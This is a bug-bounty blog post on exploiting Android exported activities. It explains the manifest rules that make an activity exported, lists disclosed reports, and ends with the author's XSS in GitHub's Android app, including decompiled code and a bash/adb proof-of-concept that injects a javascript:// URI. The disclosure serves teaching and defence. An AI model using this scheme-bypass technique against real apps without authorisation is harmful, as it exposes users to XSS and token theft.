---
title: Exploiting Exported activities in Android apps
summary: This blog post doesn't teach you the very basics of the android app, it just talks about the exported activity and their exploitation
date: "2020-11-07"
tags:
    - Android
aliases:
    - /exported-activities
ShowToc: true
---

This blog post doesn't teach you the very basics of the android app, it just talks about the exported activity and their exploitation. If you have no idea what an apk is, how to extract the apk etc then I would suggest you go through the following resources:

* [Intro to Android Hacking](https://www.hackerone.com/blog/androidhackingmonth-intro-to-android-hacking) - Blog Post
* [Diary of Inexperienced Bug Hunter](https://www.bugcrowd.com/resources/webinars/the-diary-of-an-inexperienced-bug-hunter-intro-to-android-hacking/) - Video

These resources will give some ideas about the anatomy and working of APK.

### What is an activity in the Android app?

Everything that you see in an android app is kind of being done via an activity. For example, say you click on the Facebook app icon in your phone, it will show a window with your feed, but internally system has started a `Launcher activity` whose job is to show you data in a certain format and also provide you options to move to other activities like seeing notifications or your messages.

According to Android developer docs, `An activity is a single, focused thing that the user can do`.

You can read more about android activities [here](https://www.tutorialspoint.com/android/android_acitivities.htm) and [here](https://developer.android.com/reference/android/app/Activity).

### What is exported activity?

An exported activity is the one that can be accessed by external components or apps. We can say that exported activities are like `Public` functions in Java, any other parent class or even package can call them. 

Let's understand this with an example, say you are on your home screen and now you want to start the Twitter app so you'll click on the app icon to invoke its launcher activity but technically you were already in some activity(home page) and then you started another activity(launching the Twitter app). Now if the `launcher` activity of the Twitter app isn't exported(not public) then no one will be able to invoke the activity and the app won't start. That is why there has to at least one activity exported so other components of android can start it.

### Why exported activities can be bad?

We saw that exported activities are useful since they help in starting the app and provides other functionalities so what could possibly be wrong with them?

Well, the thing is that having activities isn't wrong at all but having exported activities without any kind of protection can be bad. Because any malicious app can invoke those activities for performing various malicious actions.

### How can we define an activity in the app?

In all the android app there is a file called `AndroidManifest.xml`. Example of a defined activity can be seen below:

```xml
<activity android:theme="@style/NoDisplayTheme" android:name="com.github.android.activities.DeepLinkActivity" android:launchMode="singleTask">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="https"/>
        <data android:host="github.com"/>
        <data android:pathPattern="/.*"/>
    </intent-filter>
</activity>
```
This is an activity defined in `Github's` android app.

As you can see above `name` of the activity is `com.github.android.activities.DeepLinkActivity`, this name is selected based on the directory a file is present in. So that name resembles that there is a file named `DeepLinkActivity.java` in the directory `com/github/android/activities`.

Those launchMode and theme doesn't matter, ignore them like [The Dictator ignores Larry King's question about nuclear weapons](https://youtu.be/qqa7YhsroW8?t=100) 

Now everything in the `<intent-filter>` is important and can help us in the exploitation part. Let's look at them one by one:

* `action` - As the word says it let the activity know what kind of action has to be taken when that activity is started. So that means a single activity can have multiple actions defined. 
* `category` - TBH I don't know what it does, I never got around to understand the role of the `category` tag in `intent-filters` so I guess we can ignore them 😜
* `data` -  This is the data that is to be given to the activity for some kind of processing. In our example, we see 3 data tags but each having different attributes and they are kind of self-explanatory. All those tags say that our `DeepLinkActivity` takes data of the format `https://github.com/*`.

### How to identify an exported activity?

According to the android developer docs, an activity is considered exported in the following two cases:

* If the activity has` android:exported="true"` attribute in its definition.
* If `android:exported` is not defined at all then it should have at least one `intent-filter` in it.

Again let's understand this with an example. 

* An exported activity:

    ```xml
    <activity android:name="com.github.android.activities.DeepLinkActivity" android:exported="true"> </activity>
    ```

    Just set the `android:exported="true"`

* Another way to export an activity:

    ```xml
    <activity android:name="com.github.android.activities.DeepLinkActivity">
        <intent-filter>
            <action android:name="android.intent.action.VIEW"/>
            <category android:name="android.intent.category.DEFAULT"/>
            <category android:name="android.intent.category.BROWSABLE"/>
            <data android:scheme="https://*"/>
    </intent-filter>
    </activity>
    ```
    We can see that even though we didn't set the `android:exported` attribute at all but still this will be considered exported because this activity has `intent-filter` defined.

* An unexported activity:

    ```xml
    <activity android:name="com.github.android.activities.DeepLinkActivity"> </activity>
    ```
    Here the attribute isn't defined but since there is not a single `intent-filter` this will be considered as `not an exported activity`.
    
    If we want an activity with `intent-filters` but doesn't want it to be exported we can use:

    ```xml
    <activity android:name="com.github.android.activities.DeepLinkActivity" android:exported="false">
        <intent-filter>
            <action android:name="android.intent.action.VIEW"/>
            <category android:name="android.intent.category.DEFAULT"/>
            <category android:name="android.intent.category.BROWSABLE"/>
            <data android:scheme="https://*"/>
    </intent-filter>
    </activity>
    ```

Manually finding the exported activity is good when you are trying to learn stuff but once you are good with it you can use tools like [`drozer`](https://github.com/FSecureLABS/drozer) or if you want you can use a tool that I made called [`slicer`](https://github.com/mzfr/slicer).

### What are the possible attacks that can be done using exported activities?

Some common attacks would be to get an `XSS` in the android webview(in-app browser), open redirect(via the app take the user to some malicious URL).

Other than this it depends upon the functionality of the activity. If the activity is responsible for downloading a file in the app then it might be possible to download malicious stuff, if the activity is responsible for reading a given file then it might be possible to read the internal sensitive data of the app(user token etc)

Below is the list of all the [@bagipro](https://twitter.com/_bagipro) disclosed report which uses exported activities for exploiting different features:

* [Opening arbitrary URLs/XSS in SAMLAuthActivity](https://hackerone.com/reports/283058)
* [Possible to steal any protected files on Android](https://hackerone.com/reports/161710)
* [Access of Android protected components via embedded intent](https://hackerone.com/reports/200427)
* [Theft of arbitrary files leading to token leakage](https://hackerone.com/reports/288955)
* [XSS in ImageViewerActivity](https://hackerone.com/reports/283063)


## A bug that I found

I found an XSS bug in `Github's` android app and that issue was in the same exported activity which we have used till now as an example 😄.


```xml
<activity android:theme="@style/NoDisplayTheme" android:name="com.github.android.activities.DeepLinkActivity" android:launchMode="singleTask">
        <intent-filter>
            <action android:name="android.intent.action.VIEW"/>
            <category android:name="android.intent.category.DEFAULT"/>
            <category android:name="android.intent.category.BROWSABLE"/>
            <data android:scheme="http"/>
            <data android:scheme="https"/>
            <data android:host="github.com"/>
            <data android:pathPattern="/.*"/>
        </intent-filter>
</activity>
```

This activity had the following code:

```java
public final void G0(Intent intent) {
        String str;
        Uri data = intent != null ? intent.getData() : null;
        if (!a.d.d()) {
            B0();
            if (data != null) {
                ....
                ....
                String host = data.getHost();
                ....
                ....
                boolean z = false;
                if (j.a(str, "github.com") || h.d(str, ".github.com", false, 2)) {
                    z = true;
                }
                if (z) {
                    g.a.a.x.j.c(this, data);
                    return;
                }
                ....
```

What this code is doing is checking if the `data` to activity was provided if not stop the activity. If yes then `getHost` and check if the host matches with `github.com` or `.github.com`. If yes then open that URL in the webview.

Now [@bagipro](https://hackerone.com/bagipro) has a [golden technique to bypass host validation](https://hackerone.com/reports/431002) but that didn't work for me. But also if you scroll a bit down in that report he suggests the `scheme` validation. And I noticed that even though the host validation was present in code they weren't checking for the scheme so I decided to use `javascript://` and my exploitation script looked like:


```bash
#!/bin/bash

path="$(printf '%s' 'javascript://github.com/%0aalert\(\"mzfr\"\)')"

adb shell am start -a android.intent.action.VIEW -n com.github.android/.activities.DeepLinkActivity -d $path
```

And we got ourselves an alert:

![alert](/images/pop.png)

### Timeline

* September 30 - Reported the XSS to Github via HackerOne
* October 1 - Report triaged
* October 14 - New Version released and Fix confirmed
* October 15 - $1000 bounty + swags awarded
